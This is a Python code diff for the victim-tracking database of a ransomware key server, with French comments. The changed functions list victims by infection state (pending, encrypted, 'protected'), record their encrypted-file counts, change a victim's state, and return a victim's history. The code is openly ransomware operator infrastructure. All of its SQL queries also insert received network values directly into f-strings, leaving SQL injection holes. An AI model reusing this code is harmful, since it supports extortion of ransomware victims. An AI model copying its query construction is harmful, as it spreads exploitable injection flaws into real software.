@@ -102,26 +102,37 @@ def update(table_name, tuple_name, new_value, id_tuple=None, conn=None, cursor=N
         return query
 
 
-def get_victim_list():
+def get_victim_list(path="../serveur_cles/data/victims.sqlite"):
     """
     cette fonction construit une commande sql qui demande l'historique des changements d'état d'une victime du
     ransomware.
     :return: un dictionnaire comprenant tous les l'id, l'hash, les disks, id_state, nb_files de toutes les victims
     """
-    conn, cursor = connect_to_DB()
-    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.id_state, e.nb_file FROM victims v JOIN states s ON " \
-            "v.id_victim = s.id_victim JOIN encrypted e ON v.id_victim = e.id_victim"
-    result = execute_query(conn, cursor, query)
+    conn, cursor = connect_to_DB(path)
+    # Pending
+    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, e.nb_file FROM victims v JOIN states s ON " \
+            "v.id_victim = s.id_victim JOIN encrypted e ON v.id_victim = e.id_victim WHERE s.state = 'PENDING'"
+    result_pending = execute_query(conn, cursor, query)
+
+    # PROTECTED
+    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, de.nb_file FROM victims v JOIN states s ON " \
+            "v.id_victim = s.id_victim JOIN decrypted de ON v.id_victim = de.id_victim WHERE s.state = 'PROTECTED'"
+    result_protected = execute_query(conn, cursor, query)
+
+    # Autre
+    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, null FROM victims v JOIN states s ON " \
+            "v.id_victim = s.id_victim WHERE s.state NOT IN ('PROTECTED', 'PENDING')"
+    result_other = execute_query(conn, cursor, query)
     disconnect_from_DB(conn)
-    return result
+    return result_pending, result_protected, result_other
 
 
-def change_state(recv_data):
+def change_state(recv_data, path="../serveur_cles/data/victims.sqlite"):
     """
     cette fonction change l'état d'une victime dans le ransomware si et seulement l'état était PENDING ou CRYPT
     :param recv_data: le dictionnaire CHANGE_STATE qui permet de récupérer l'id concerné
     """
-    conn, cursor = connect_to_DB()
+    conn, cursor = connect_to_DB(path)
     query = f"SELECT s.state FROM states s WHERE id_victim = {recv_data['CHGSTATE']}"
     if (execute_query(conn, cursor, query))[0][0] in ['PENDING', 'CRYPT']:
         query = f"UPDATE states SET state ='{recv_data['STATE']}' WHERE id_victim = {recv_data['CHGSTATE']}"
@@ -129,15 +140,26 @@ def change_state(recv_data):
         disconnect_from_DB(conn)
 
 
-def get_history(recv_data):
+def get_history(recv_data, path="../serveur_cles/data/victims.sqlite"):
     '''
     Cette fonction récupère l'historique d'une victime d'un ransomware au moyen de la requête ci-dessous
     :param recv_data: le dictionnaire HISTORY_REQ qui permet de récupérer l'id concerné
     :return: le résultat de la requête, l'historique de la victime x
     '''
-    conn, cursor = connect_to_DB()
-    query = f"SELECT s.id_state, s.datetime, s.state, e.nb_file FROM states s JOIN encrypted e ON s.id_victim = " \
+    conn, cursor = connect_to_DB(path)
+    condition = execute_query(conn, cursor, f'SELECT state FROM states WHERE id_victim = {recv_data["HIST_REQ"]}')
+
+    if condition[0][0] == 'PENDING':
+        query = f"SELECT s.id_state, s.datetime, s.state, e.nb_file FROM states s JOIN encrypted e ON s.id_victim = " \
             f"e.id_victim WHERE s.id_victim = {recv_data['HIST_REQ']} "
+
+    elif condition[0][0] == 'PROTECTED':
+        query = f"SELECT s.id_state, s.datetime, s.state, de.nb_file FROM states s JOIN decrypted de ON s.id_victim = " \
+            f"de.id_victim WHERE s.id_victim = {recv_data['HIST_REQ']} "
+
+    else:
+        query = f"SELECT s.id_state, s.datetime, s.state, null FROM states s WHERE s.id_victim = {recv_data['HIST_REQ']} "
+
     result = execute_query(conn, cursor, query)
     disconnect_from_DB(conn)
     return result
